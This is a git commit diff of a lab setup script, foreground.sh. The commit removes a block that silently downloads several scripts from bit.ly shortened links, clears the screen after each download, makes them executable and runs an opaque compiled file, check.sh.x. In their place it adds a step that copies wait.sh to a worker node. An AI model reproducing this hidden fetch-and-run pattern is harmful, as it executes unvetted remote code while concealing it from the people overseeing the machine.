9e539357a857860e51ccb9941cef64a3211a64a2
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-31 17:49:17 +0700

    Update foreground.sh

--- Course3/foreground.sh
+++ Course3/foreground.sh
@@ -1,17 +1,13 @@
 #!/bin/bash
-ssh node01
-wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
-clear
-wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
-clear
-wget -O win11vm.sh https://bit.ly/3kZh2iU > /dev/null 2>&1
-clear
-wget -O check.sh.x https://bit.ly/2URrs9I > /dev/null 2>&1
-clear
-wget -O region.sh https://bit.ly/3xaNAsA > /dev/null 2>&1
-chmod +x win11vm.sh
-chmod +x exit.sh
-chmod +x sleep.sh
-chmod +x region.sh 
-chmod +x check.sh.x
-./check.sh.x
+
+
+
+if [ "$HOSTNAME" = controlplane ]; then
+    while [ ! -f /usr/local/bin/wait.sh ]; do sleep 1; done; scp -r /usr/local/bin/wait.sh node01:/usr/local/bin/
+    ssh node01 
+
+else
+    sleep 999999
+fi
+  
+wait.sh
